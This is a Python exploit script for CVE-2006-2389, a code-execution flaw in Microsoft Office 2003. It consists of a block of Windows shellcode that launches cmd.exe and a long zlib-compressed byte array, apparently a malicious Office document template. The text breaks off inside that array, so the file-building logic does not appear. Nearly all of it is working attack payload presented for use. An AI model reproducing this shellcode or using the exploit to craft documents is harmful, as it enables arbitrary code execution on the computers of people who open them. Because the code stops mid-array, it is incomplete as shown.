#Microsoft Office Property Code Execution exploit (CVE-2006-2389)
#Author Abhishek Lyall - abhilyall[at]gmail[dot]com, info[at]aslitsecurity[dot]com
#Web - http://www.aslitsecurity.com/
#Blog - http://www.aslitsecurity.blogspot.com/
#Vulnerble application MS office 2003
#Tested on XP SP2 - MS Ofice 2003 
#Greets Mila http://contagiodump.blogspot.com, Villy and ASL IT SECURITY TEAM
#!/usr/bin/python




import sys
import zlib

#Allwin WinExec cmd.exe + ExitProcess Shellcode - 195 bytes by RubberDuck =)
shellcode = (
b"\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
b"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
b"\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
b"\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
b"\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
b"\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
b"\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
b"\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
b"\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
b"\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
b"\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
b"\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
b"\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE"
b"\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53"
b"\xFF\xD2\x68\x63\x6D\x64\x01\xFE\x4C\x24"
b"\x03\x6A\x05\x33\xC9\x8D\x4C\x24\x04\x51"
b"\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\xFE"
b"\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45"
b"\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54"
b"\x24\x20\x57\xFF\xD0"
)

compressedfile = (
b"\x78\x9C\xED\xDD\x0D\x9C\x4D\x75\xFE\xC0\xF1\xEF\xBD\x73\x67\xCC\x93\x31\x9E\xC7\x78\x1A\x9A\xC4\x98\x34\x31\x84"
b"\x18\x8F\xA1\xC9\x53\x9E\x09\x0D\xA1\x31\x86\x11\xE3\x61\x65\x6B\x48\x56\xA5\x56\x25\x49\xA2\x07\x49\xDA\x24\x49"
b"\x25\x49\xD6\x5A\x21\xC9\x4A\x65\x7B\x60\x64\xEB\x2F\xB5\x93\x55\x28\xB9\xFF\xCF\xEF\x9C\x73\x67\xEE\xBD\x73\x0F"
b"\x77\x34\x2D\xAD\xDF\xEF\xFB\x7A\xCF\xB9\xBF\x73\xEE\x3D\x4F\xBF\x73\x7E\xE7\xE1\xFE\xEE\x99\xDD\xEF\x97\x3F\xF0"
b"\xD4\xCB\xF1\x07\xC5\x2F\xA5\x49\x88\x9C\x71\x47\x48\x98\x57\x3F\x27\x36\x78\x32\xB1\x22\x1B\xE9\x38\x70\xC6\xED"
b"\x76\xAB\x5E\xEB\xF1\x26\xDC\x3A\xFD\x6E\xD2\xD1\x67\xDF\x91\x6E\x09\xD5\x5C\x22\x05\x15\xDE\x2E\x2C\x59\x12\x7D"
b"\xF6\xEE\x12\x89\x91\xE1\x59\xC3\xB3\xF2\x5B\xE7\xB7\xF6\xDF\x42\x44\xAA\xB9\xAA\x48\xAD\x18\x87\xE4\xF5\x17\x43"
b"\xD6\xC8\xE2\xEF\xF1\x4E\x6E\x77\xB9\x73\xBE\xF6\xA4\x6C\xE3\xEF\x32\x87\x14\x76\xBD\x5F\xDB\x75\x2B\x79\x8D\x61"
b"\xAF\xD3\xEC\x26\xD4\xB5\xEF\x26\xD2\xED\x48\x77\xAF\xD7\xFB\x0F\xB7\x11\x69\xCF\xB8\x12\x2F\x33\xF3\xE7\xEA\xDE"
b"\x97\x18\xB8\xEB\x6A\x63\xEE\x31\x61\x6D\xCC\x7C\x30\x5D\xF5\xD1\x2B\xDA\x31\x6F\x7C\xB0\x73\x07\x91\x99\xE4\x93"
b"\xE8\x3F\xA9\xD8\xFA\x29\x5A\x6E\xCF\xF4\xFC\xD3\x68\xFA\xD7\x3D\xCB\xFC\x25\x59\xD3\x7D\x30\xC5\x77\x7C\x9E\xAE"
b"\x67\xF9\x3C\x49\xE5\xAF\x63\xD8\x52\x3E\x57\xC5\xEB\x73\xFE\x5D\x35\xFE\xCD\x51\xC5\xC7\xE3\x9F\x77\xB5\xF1\x1D"
b"\xBF\xE7\xF3\x25\x4D\xDE\xEB\xDB\x33\x9E\xAF\x9D\x45\xE3\xFB\x43\x13\xE6\x97\xFC\x9C\x96\x6C\xA5\x01\xB6\xA3\xF3"
b"\x4D\x19\xAD\xCC\xAE\x67\x79\xE2\xE8\x46\x1B\xAF\xDE\xE8\xF1\xC2\xAC\x77\x1C\x6A\x7B\xEA\x5A\xBB\x68\x7B\xEB\x96"
b"\x62\x96\x47\x38\x9F\x4B\xF6\x1B\xCF\x32\xDE\xFB\x2A\xF3\xAF\x66\xF9\xB0\xB5\x1C\xA9\xD6\xFB\xDE\xED\x60\xE6\x73"
b"\xAC\xCF\x7B\xF2\x9E\xE9\x7B\x96\xF3\x75\x87\xB9\xBD\xB4\x64\x5C\x8B\xC4\x7B\x39\x57\xAE\x94\x00\x79\xA7\x7C\xC2"
b"\xDF\x84\x73\x46\x59\x22\xDC\xF8\xAB\x72\x3A\xE9\xA4\x93\x4E\x17\x6B\x3A\x77\x7D\xA6\x43\x87\x0E\x1D\x3A\x74\xE8"
b"\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0"
b"\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1"
b"\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43"
b"\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x8E\x8B\x21\x16\x6F\xBA\xD0\x73\xA0\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1"
b"\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43"
b"\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87"
b"\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E"
b"\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xA1\x43\x87\x0E\x1D\x3A\x74\xE8\xD0\xF1\xDB\x84\x4E\x25"
b"\x48\x2E\x91\x7A\xA8\x8F\x87\x30\x33\x54\x64\x15\x56\xA3\x6D\x98\xC8\xA7\x65\x44\x0E\x60\x42\xB8\xC8\x64\x54\x88"
b"\x12\x99\x8E\x3C\x54\x88\x16\xA9\x82\xB8\x18\x91\x5A\x38\x5E\x5E\xE4\x47\xF4\xAB\x20\x32\x0D\x6B\xB1\x1D\x3B\x71"
b"\x00\xF1\x15\x45\x9A\xA1\x39\x3A\x62\x68\x15\x91\x0C\x6C\xC1\x56\x48\x55\xC6\x87\x38\x24\x60\x31\x96\xC0\x19\xC7"
b"\x6C\x22\x0D\x7D\xD0\x0F\x43\xB1\x10\x7F\xC1\x11\x48\x35\xDE\x87\x2A\xE8\x89\xE9\x58\x8C\x25\xD8\x87\x8F\xF1\x13"
b"\xCE\x20\xBE\x3A\xCB\x86\x0C\x0C\xC7\x54\x2C\xC7\xE7\x88\xAC\x21\x92\x84\x64\x6C\xAD\x2D\xB2\x0D\xC9\x09\x22\x8D"
b"\xD0\x0B\xB9\x78\x00\xF3\xB0\x16\xEB\x10\x5D\x47\x24\x06\x27\xBE\x3E\x24\x87\xF6\x1F\x92\x0F\x09\xBA\x2A\xDE\xB7"
b"\xBA\xE6\xEB\xF7\x7D\xBA\xDE\x43\xF6\x17\x7B\x9F\x21\xAA\x4B\x92\xA3\x47\x7A\x88\xDC\x88\xF0\xB1\x5D\x22\x5C\x13"
b"\x21\xB1\x9E\x5E\x85\x7D\xC2\x3D\x7D\xA4\x46\x48\x96\x2A\x55\x4F\xBE\x6F\xB8\x63\x6C\x17\x71\x8D\xC3\xA4\x70\x87"
b"\x94\x6B\x1A\x3E\xA3\x43\x7A\xA5\xC2\xC1\xD2\x4B\x95\x7F\xA2\xB5\x0D\x24\x21\x19\xA3\x30\xCF\x6B\x7B\x98\x85\x87"
b"\xB0\x0D\xDB\x91\x16\x66\x6E\x1B\xC3\x23\x45\x46\x44\x9A\xDB\x44\x25\x54\x41\x2A\x9A\xB1\x4D\x34\x47\x3A\xBA\xAA"
b"\xD7\x65\x45\x5A\xE2\x17\xEF\xED\xCE\x27\x73\xF2\xD7\x66\x7E\x2C\xD5\xB1\xF9\x64\xBE\x0D\x2E\xF3\xA5\x6D\xA6\x74"
b"\x67\xC7\x27\xE3\x95\xD8\x37\x43\x12\x43\xCA\xCF\xDA\xED\xCC\xC0\xB0\x44\x36\x98\x58\xFF\x3E\x8E\x58\x63\x7F\x0F"
b"\x49\x74\x0C\x4B\x74\x88\xA3\x1C\xBB\x82\xCA\xEF\xDD\xE5\x57\x1C\x3A\x5D\x02\xC9\xE5\x12\x87\xC3\xA1\xF6\xCB\xEE"
b"\xE8\x89\x35\x58\x8B\xED\xC8\x47\x0A\x75\x7A\x63\x34\x43\x4B\xA4\xA1\x2D\x7E\xF2\x1E\xCD\x0F\xC1\x65\x8E\x06\x97"
b"\xC9\xAE\x71\x1E\x9F\x89\x0B\x09\xB0\x78\x77\x52\x1F\x25\x3A\xAA\x26\x3A\xAE\x1F\xE5\x20\xEB\x5C\x90\x2D\xA1\xFB"
b"\xE2\xC2\x1C\x0E\x09\x24\x7C\x5F\x27\x09\x99\xEF\x3E\xED\x9A\x5D\x39\xB6\x9E\x84\x65\x86\x16\x1B\x5F\xD8\xBD\xB1"
b"\xC1\xF4\x8B\xCC\x8D\x95\x97\xA4\xE2\xBE\x14\x63\xB8\xC3\x7A\x5F\x10\xDD\x4A\x3F\xF2\x27\x7E\x1F\xD5\xA5\xB8\x3D"
b"\xAA\xFB\x66\x6B\xF8\x66\x6B\xFA\x66\x53\xF7\x85\x89\x23\x32\x24\x5B\x86\xFD\xC8\xFA\x88\x30\x76\xF3\x2A\x9E\xC5"
b"\x57\xFB\x7B\xD1\x9E\x6F\xBC\xA2\x46\x70\x4A\xB4\x2A\xCF\x8E\xB8\x03\x1B\x11\x4D\xA5\xB0\x0A\xDB\xB1\x13\xBB\x51"
b"\x8B\xA5\x1C\x8C\x25\xB1\x7E\x15\x6D\x90\x05\xE4\x93\xF1\x19\x41\x76\xAB\x32\x36\x43\x86\x07\x97\x31\x13\x0B\x1B"
b"\x59\x4F\xA2\x3A\x39\xA5\x70\x81\x2F\xF5\xF2\x2F\x5C\x27\x8E\xA2\x75\x12\x60\x9B\x88\x52\x65\x3A\x99\x73\xB6\x78"
b"\xCE\xCF\x96\xC0\xC5\x79\x59\x26\xB2\x30\x0E\x9B\xD1\xB5\x12\x75\x44\x25\xBF\x1D\xFA\x9B\xF3\xC8\x8C\x99\x53\xBE"
b"\x28\x63\x5F\xA8\x83\x6D\x33\x45\x29\x4C\xCE\xBA\x5C\xBA\xF4\xCD\xD2\x0F\xF1\xDA\x23\x02\xED\x25\x91\xAA\x5C\x7B"
b"\xA2\x17\xFA\x60\x55\x65\xCE\xFD\xB1\x06\x6B\xB1\x0E\xAF\x63\x3D\x36\x60\x23\x36\xC1\xC5\xF9\x7A\x18\xC2\x31\x0B"
b"\x47\xD0\x91\x73\xF5\x4E\xD8\x8C\xFA\x9C\x93\xCF\xC4\x29\xEF\xD5\xF3\xBB\xC9\x14\xD8\x66\xFE\x65\x9B\xF9\xD4\x76"
b"\x6C\xF6\x9F\xD9\x23\x41\x25\x4F\xC9\x85\x05\x28\x4D\x57\x80\x7E\x21\x67\xDB\x37\xBC\xF7\x1C\xA9\xAA\xCA\x68\x2F"
b"\x5A\x5A\xD7\x4A\xA7\xAD\x6B\xA4\x69\xF1\x5C\x0F\xC5\x9B\xD7\x47\xDB\xAA\x9B\xD7\x43\xF6\xFB\xBF\xFD\x71\xFF\xB0"
b"\xED\x67\xEC\x47\xE0\x33\xE4\x9F\xE7\x5A\x39\x97\x64\xF2\x94\x74\x78\x51\x59\xFA\x94\xEB\xD9\xF6\xFF\x32\xDE\xFB"
b"\xBF\x2A\xD7\x46\x68\x8C\x8E\x35\x45\xE6\xD6\xE2\xFA\x16\x99\x5C\xF7\x66\x21\x1B\xE3\x30\x1E\x47\x71\xE7\xD1\xE8"
b"\xA2\xB9\x98\xEC\x3D\x4B\x3E\x99\xF1\xBF\x5D\x66\x94\xED\x4A\x09\xB4\xD4\xFA\x38\x71\xD6\xE3\x44\x94\x2A\x53\x75"
b"\x5F\xC3\x73\x2F\xA3\x71\x1D\x91\x85\x38\x86\x8E\x75\x45\x9E\xC6\xB2\xBA\x67\xDB\xC3\xFF\x6D\x3B\xC4\xBE\x22\xF0"
b"\xD9\xA9\x3F\xF0\xCE\xDC\x28\xC5\xD2\xA5\x5E\x46\x9E\xAD\x3A\xE2\x1C\xFB\x72\x80\xA3\xC4\xB9\xEB\x04\x75\xDF\x6A"
b"\x02\x72\xB1\x0A\xBB\x51\x60\x95\x7F\x38\xE5\x5E\x0B\x89\xA8\x87\x96\x68\x85\xF6\x75\xCD\x6D\x63\x3A\xEE\xC0\x46"
b"\x3C\x74\x99\xC8\x49\x9C\x41\xA5\x7A\x4C\x16\x93\xB1\x18\xFB\xE0\xBA\x82\xCF\x22\x13\xCB\xEA\x8B\x2C\x47\x64\x03"
b"\xAE\x37\xD0\x09\x99\x98\x9B\x44\xDD\x83\x63\x38\x8E\x46\x0D\x39\x37\xC1\x78\x4C\xC0\x1C\x2C\xC1\x32\x2C\xC7\x7A"
b"\x6C\xC0\x66\x6C\xC1\x7E\x84\x27\x73\x8D\x8A\x6C\xCC\xC5\x03\xD8\x8A\x6D\xD8\x73\x25\xC7\x3A\x34\x6F\xC4\xB2\x20"
b"\x17\x0B\xB0\x0E\xAF\x63\x17\xBE\xC4\x11\x1C\x85\x5C\xC5\xD6\x86\x70\x44\x22\x01\xDD\x31\x1B\x6B\xB0\x07\x7B\x11"
b"\xCD\x26\x12\x83\xBA\x4D\x44\xD2\xB1\x09\x5F\xA2\x4F\xAA\xC8\x00\xC4\x35\xE5\x35\x76\x61\x37\x5A\x36\x13\xF9\xF9"
b"\x87\x9F\x8F\x7A\xC5\x0F\x3F\x8B\xF1\xD7\x93\xFB\xA1\xF0\xAF\x7F\xFC\x60\xDB\xBF\xE8\x35\xB3\x5E\xFC\x1E\xA1\xCF"
b"\xBD\x44\xCF\x8B\x21\x6A\xDF\x5E\x8E\x15\xD8\xE0\x55\x96\xF3\xB1\x12\x9B\x11\x9B\x28\x52\x01\x35\xD0\x2F\xD1\xEF"
b"\xFA\x3F\xC8\x9B\x01\xFF\xB1\xFD\xCC\x91\xE0\x32\x59\xC7\xC3\x82\x79\x9B\x91\x2E\xF1\x1A\x23\xC0\x71\xAE\xF0\xCE"
b"\x9F\x71\xD5\x5F\x74\x27\x20\x5A\x95\xE7\x42\x54\xBA\x9C\x32\xC7\x02\xB4\x64\x7F\xDD\x88\x4D\xA8\xC7\xFE\x7A\xEF"
b"\x15\x41\xDF\xE6\xF1\x39\x18\x1C\xB6\xCD\x7C\x6A\x3B\x24\xC8\x33\xE2\x4B\x2B\x79\x6A\xEE\xD8\xB3\x9E\xCB\x9C\xE3"
b"\xEC\xA7\x70\x78\xA4\x77\x3F\x55\xB6\x73\xB1\x00\xDD\xA9\x93\xB7\x23\x85\xBA\xF8\x5E\x55\x1F\x63\x01\x9A\x51\x17"
b"\xAF\x41\x5C\x43\xB5\x6B\xB9\x8A\xE6\xCB\xFE\xFC\x2F\xDB\x36\xE3\x73\xA5\x7F\xE7\x16\xAF\x9D\xFA\x7C\xC6\xE6\xBB"
b"\x7E\xCA\x95\xF4\x5A\xE8\x52\xAF\x29\x24\x2A\xCE\x3A\xB6\xAA\xE3\x67\x92\x75\xBC\x3C\x8A\xEF\x70\x12\xD3\xAF\x3C"
b"\xDB\xC5\xD9\x41\xDB\x21\x1F\x79\x67\xFA\xCF\xF5\x2A\xE6\xEE\xDE\x43\x7C\x32\xFE\x49\x97\x97\xED\xB9\x60\xF9\xF3"
b"\xB8\xD6\x0B\x74\x17\x21\x5C\x95\xEF\x49\x0C\xB5\xCE\x81\xD4\x79\xCE\x78\xEB\xBC\xA6\x31\x8B\x9B\x8A\x66\x29\x67"
b"\xAB\xF2\xED\x37\x88\x1F\x6C\x87\xF8\x6E\x1D\xDE\x99\x5E\x12\x20\x15\x1D\xAF\x74\xF9\x9B\x65\x58\xE1\x3C\xCA\x3A"
b"\xE0\x76\xA2\xCA\x76\xBC\x2A\xE7\xAB\x39\xEF\x6E\xCC\x79\x37\xC2\x38\x77\x0D\x47\x17\xEB\x7C\x76\x21\xE7\xB0\x8B"
b"\xD0\x8F\x73\xD7\x01\xA8\xD5\x9C\x6B\x80\x96\x6C\x1F\xAD\xF9\x1C\xBA\x60\x31\x96\xE0\x53\x34\x4A\xF3\xFB\x3E\xD1"
b"\x7E\xE3\xF1\x79\x9B\xFD\x5D\x37\xFB\x8C\xFD\x2D\x25\xFB\xCF\xE4\x9F\x47\xE6\xB3\xE0\x46\xBD\xD7\x36\xF3\x2B\x93"
b"\xDD\xF7\x39\xC6\xF9\x5C\xF1\xEF\x7E\x8D\x61\x21\x85\xAF\xD4\xBE\x63\xBE\xC9\xD8\x02\x2A\x8A\xF1\x6D\x30\xE3\xA9"
b"\xAC\xAE\x45\x5A\xA1\x23\x3A\xA1\x0B\x86\x5E\x23\x92\x81\xAD\x94\xF3\x36\x84\xB7\x60\xCB\xC1\x3C\xCA\xFC\x21\x2C"
b"\xC2\x62\x3C\x89\xB6\xD7\xB2\x2D\xA0\x71\x2B\xB6\x0F\xE4\xB5\x15\x99\x89\x59\x78\x00\x79\xED\x78\x1F\x96\x63\x3D"
b"\xFA\xB5\x67\x1B\x42\x6E\x07\x8E\xF1\xB8\x03\x79\xD8\x8A\x6D\x90\x8E\xEC\xEE\x18\x85\x4C\x8C\xC7\x04\x1C\x40\x3E"
b"\xD6\x5D\xC7\x75\x1E\x06\x74\x12\x19\x84\xC1\x18\x81\x69\x98\x8E\x8D\xD8\x84\x84\xCE\x5C\x8F\x21\x09\xC9\x18\x8F"
b"\x09\x98\x86\x99\x58\xD1\x45\x64\x35\x16\x5D\xCF\xB2\xE0\x5F\xF8\x1A\x05\x38\x86\xF9\xE9\x9C\xFB\x60\x13\x36\x63"
b"\xCD\x0D\x22\x6B\xB1\x01\x1B\xD1\xB8\x2B\xDB\x3E\xD2\xD0\x16\x1B\xB0\x11\xB3\xBB\x71\x9D\x8A\xED\x3D\xB8\xDE\x43"
b"\x95\x9E\xEC\xFF\x90\x9B\x44\x4E\x1D\xFF\xEE\xF0\x71\x33\xBC\x5E\x7A\xF5\xF2\xE9\xFA\xF7\xB7\x7B\x8F\xA8\x90\xA0"
b"\xAF\xF8\x24\x2A\xAD\xA8\xAF\x0C\x52\xFB\x6A\x0A\x3A\x61\x28\xA6\x62\x1A\x1E\x5C\xE8\xB5\xF1\xCD\x91\x92\x67\x7E"
b"\xA7\xA9\xF8\x7E\x36\x8E\x7A\xC5\xEF\x90\x13\x92\xEA\x08\x70\xD4\xF9\xA6\x81\xE7\xA8\x93\x22\xCE\xF9\xEE\xDB\x6A"
b"\xA8\x63\xCE\x67\x35\xFC\xA7\x90\x11\xB6\x34\xE2\xEA\x7F\x8E\x7A\x33\xF9\xD6\xAB\xDF\x6D\xF7\xCE\xC1\x58\xC7\x8E"
b"\x6F\x22\x77\x17\x1E\x5F\x7A\x67\xB9\x3A\x90\x7A\xDF\x93\x9F\x15\x3E\x60\xE0\xC0\xF7\x1A\xB5\x0A\xBD\x29\x77\xDF"
b"\xEB\x07\xF3\xF3\x0F\xDD\xF3\x45\x67\xD2\x4B\x93\xB6\xB9\xBF\xEA\x68\x25\xCF\xF1\x85\x7D\xDB\x3A\xB6\xB8\x49\x9E"
b"\xE3\x4A\x61\xDF\x9A\x45\x2F\x53\xFF\xDA\x44\x52\x8A\x8E\x27\xA1\xAA\xAC\xA7\x63\x09\xF2\x51\xBF\x0D\xFB\x0C\x92"
b"\x91\x82\x54\x34\x47\x77\x8C\xC9\x70\x14\x2D\x46\x90\x5F\xD0\xFA\x64\xC6\x74\x29\xF9\x67\x02\x7C\xDD\xEB\x9F\x8A"
b"\x97\xD9\xFC\xE2\xA7\x09\x81\xCB\xAC\xE8\x4C\x61\xB0\xB8\xE6\xBB\x9B\x44\xEC\xA9\x60\x96\xDB\xD2\x88\x62\x93\x09"
b"\xB2\x5F\x42\x80\x7E\xBF\xF6\xFC\x41\x9D\x90\xB8\xC5\xE7\x1C\xA2\x58\xAF\x1A\xC5\x7B\xD5\x2C\xDE\xCB\xEF\x7C\x22"
b"\x52\x95\x6B\x4F\xF4\xC1\x00\x0C\xC6\x34\x4C\x47\x1E\x66\x61\x0E\x9E\xC6\x32\x64\x0F\xF0\x5A\xAC\x5B\xA4\xE4\x99"
b"\xEC\x9E\xBF\x76\x04\x6D\xA5\x58\x0A\x70\x74\x7C\xA8\x84\x67\x8A\xA5\x56\xFE\x81\xFA\x5D\xB4\xE5\x1F\xA5\xCA\x74"
b"\x05\xFE\x82\xD5\xD8\x8C\x2D\xD8\x8A\x03\x88\x67\x6D\x0F\x6A\xEB\xD7\x38\x23\xC8\x8C\x4F\xB1\x0D\xF5\xCE\xF4\x0D"
b"\x2E\xE3\x9B\x6C\xCE\x72\x1C\xBA\xB4\x83\x2C\xED\x40\xF7\x8C\x54\xD9\x0E\x46\x3A\xE7\x66\x5D\xB1\x01\x1B\xD1\x88"
b"\x73\xA8\x14\x64\xE2\xCB\x00\xE7\x33\x19\xFD\x44\xA2\x07\x8A\x71\x5E\xE3\x42\x4F\xF4\xC1\x69\xC4\x0F\xE6\x1C\x0B"
b"\x47\x30\x68\x08\xE7\x56\x43\x82\xDE\x64\xBE\x0F\xEE\x6D\x41\x66\x7C\xEE\x2C\x1E\x38\x8F\x21\xF6\x19\x9F\xCF\x7C"
b"\x7C\x1E\xD3\x39\x9F\x0C\x29\xBC\xBC\x2A\xC3\xB2\x5B\x5D\x8E\xC9\x97\xAB\x12\x0C\x2D\x2F\x56\x26\x5A\x0D\x09\xB1"
b"\x32\x81\xF7\x92\xE2\x7B\x50\xB5\x40\xE5\xD7\x9E\x7D\x35\x1F\xFF\x42\xE3\x9B\xB9\xFE\xC7\x1E\x4C\x1F\xC9\xF9\xF7"
b"\x28\xCE\xE3\x11\x79\x2B\x87\xE6\x31\x5C\x2F\x72\x7A\x74\x12\x07\xC6\xB3\x9D\xA8\xEF\x69\x6F\x63\x7C\xF8\x7C\x82"
b"\x48\xCB\x5C\x91\xEF\x26\xB1\x5D\x4D\xE1\x9C\x7D\x2A\xFD\x30\xE8\x8F\x54\x05\x68\x7C\x07\xDB\xD9\x6C\xCE\x2D\xEE"
b"\xE3\xFA\x03\x6B\xE6\x72\xAE\xF1\x67\x91\x33\x9C\x77\x3A\x1F\x13\xD9\x87\xB9\x4B\x38\xFF\xC6\x16\xE4\x3F\x2D\x52"
b"\xEF\x19\xC6\x87\x63\x68\xBF\x8C\x73\x56\x64\xBE\xC3\xFC\x6C\xE1\xBD\x5B\x19\x86\x5D\xBB\xCC\xF6\xAC\xF2\x73\x49"
b"\xE2\x98\xD9\xFD\x1F\x4D\x67\x69\x2F\xDE\x54\xED\x9B\x69\x43\xED\xCB\xBC\x00\x03\x32\x28\x07\x24\x0D\xE3\xBA\x08"
b"\x67\x30\x8A\xF3\xB2\x3D\x68\x49\x25\xBF\x1C\x55\x46\x70\xBE\x80\x82\x11\xC5\xB7\x93\xFA\x98\x87\xD3\xB7\x9E\xED"
b"\xBB\xA3\xEF\x4A\x75\xC8\xEF\x26\x53\xBA\x0B\xE7\x93\xEC\x6A\x84\xA2\x3A\x43\xAA\xAB\x32\x19\x91\x29\xB2\x13\xA9"
b"\xA3\x39\xCF\x43\x74\x16\x65\x88\x70\xF6\xEF\xA1\x63\x7C\xF7\xF3\xF1\x39\x5C\xBB\xE7\x04\xDE\xDF\xF3\x11\x3B\x91"
b"\xE1\xD8\x8B\xE6\xB9\x45\x75\xC0\x31\x24\x4C\xBE\xB8\xD7\xB1\x7D\xE6\xC2\x6F\x8E\x41\x8E\xDA\x27\x05\x53\xFE\xAA"
b"\x4C\x66\xE1\x4B\x74\x99\x62\xD6\xD5\xA9\xD4\xD3\xCD\x91\x8E\xAE\x53\x03\xD7\xDD\xCD\x30\x19\x47\x31\xEE\x4E\xCA"
b"\x1B\x29\x79\xD4\x0F\x08\x9B\x21\x32\x1B\x05\x48\x9F\x49\xDD\x8E\xB4\xBB\x4A\x61\xB9\x7D\x32\xF6\xAD\xEA\x7C\x32"
b"\x41\xAE\x45\xFB\xCF\x5C\xCC\x19\xDF\xE4\x7F\x6E\x10\x44\xF9\xC7\xAB\x72\x19\x80\x2D\xF8\x1C\x59\xB3\x38\x77\x43"
b"\xCC\xDD\x94\x1D\x46\xA0\x00\xB5\x38\x56\x37\xC3\xFA\xD9\xE6\x71\xBB\xDF\x3D\xBE\xC7\xEE\xF8\xFB\xF9\x1C\x8E\xA0"
b"\xD7\x03\x8C\x0B\x29\x7F\x36\x8F\xE9\xC7\x1F\xE1\x58\xF1\xA8\x79\x6C\xBF\xF0\xEB\xEC\x57\x6F\x78\x17\xE4\x08\x14"
b"\x64\x45\xE5\x93\x82\xD9\xFF\x3D\xE7\x5B\x9D\xAC\x73\xAE\xFD\xE8\xB9\x88\xD7\x18\xFA\x38\x5D\xF4\x59\x4C\xF9\x21"
b"\xF9\x09\xAE\x11\xE1\xE4\x7C\x6C\xCE\x12\xDF\xF3\xB3\xAE\x4F\x9A\xE7\x68\xA7\xFD\xCE\xD3\xBA\x70\x8E\x36\xEA\x39"
b"\xBF\x85\x39\x66\x9B\xB9\xF0\xE5\x6E\x9F\xB1\x9F\xD1\x20\x6B\x9F\x20\x2B\x9C\xCF\x6C\xDF\xE6\x93\x22\x0A\x4B\xD1"
b"\x53\xB4\x76\xE5\x6D\x7F\xCD\x20\xD5\x54\xD9\x2C\x58\xC9\xB9\xDB\x4B\x1C\x07\x50\x6B\x2D\xC7\xEF\x57\x45\xBE\x5E"
b"\x47\xFD\xFE\x06\xFB\xFB\x7A\xEA\x84\x0D\x22\x5B\x37\x98\xE7\xDA\xD9\xD8\x8B\x96\x9B\x45\x9E\x44\xD8\x5F\x39\x27"
b"\xC0\x7E\x74\xE4\x3C\x7C\xDD\x96\xA2\xF3\xF1\x79\xA8\xF1\x77\x91\x15\x48\xDD\xE6\xD7\x06\xE8\xC2\x67\x82\xDC\xA5"
b"\x7E\xC3\x8C\xFD\xEC\x04\x79\x70\xF3\x4D\x46\x39\x3B\x0B\xCB\xD9\x19\xC4\xB5\x61\xBC\x2A\x97\x4D\xE8\xFA\x2E\xFB"
b"\x3D\x3E\x45\xE6\x76\xEA\x6C\xE4\xED\xA0\x0E\xD9\xC9\x39\x1D\x16\xA3\xFE\x7B\x22\x6B\xD1\x96\xEB\xAB\x9D\xBB\xCC"
b"\x6B\xAD\xDD\xD8\x63\x5D\x73\x9D\xF0\x9E\x99\xDF\x4D\xC6\x67\xBD\xFF\x9F\x6D\xC6\xE7\x27\x9D\x17\x61\x0A\xF4\xEB"
b"\xAE\x62\xD7\xFB\xFE\x5B\x88\x54\xA8\x21\xB5\x57\xCF\x6C\x94\xB0\x7A\x6B\xBB\x3A\xAB\x9F\x0D\xAB\xBB\xFA\x1A\xE7"
b"\x65\xF3\xC6\xB9\x12\x71\xF9\xEA\x0B\xBD\x48\x3A\xFD\xF6\xA9\x92\x54\x94\x48\x71\xC8\x68\x29\x27\x45\x3F\xA3\x6C"
b"\xCC\x4E\xFE\xBD\xDB\x49\x37\x5A\xCA\x88\xFF\xD3\x15\x9C\x88\x95\x95\x7E\xA9\xF8\xB8\x5B\x4A\xBB\xB6\xC7\xDC\x4F"
b"\xD1\x8D\x96\xCA\x12\xDC\xB3\x1B\xFC\x9F\xDF\xD0\x5C\xD2\xDA\x3A\x38\xF4\x36\x67\x1C\xE1\x01\xDE\xA9\xBE\xD8\x32"
b"\xB7\xFB\x18\xE9\x90\x1E\x27\x99\xE1\x92\xDB\xA5\x9A\x6B\x52\xB8\xA4\x49\x7B\x3E\xE9\x74\xA4\xF1\xC9\x98\x73\x4C"
b"\x2F\x5C\x62\x3D\x7B\x4F\xE1\x6F\xE3\x07\xC9\x99\x1E\x0E\xA9\xE0\x18\x14\x70\x1D\xD4\x17\x55\xB9\x5E\x26\x51\x22"
b"\x6F\x87\xDC\x51\xA6\x75\xD4\xE9\x98\x37\x2B\x4C\xAB\xD2\x22\xFE\x64\xCD\xD7\xEA\xA8\x23\x6B\x61\xAA\xC0\x18\x5D"
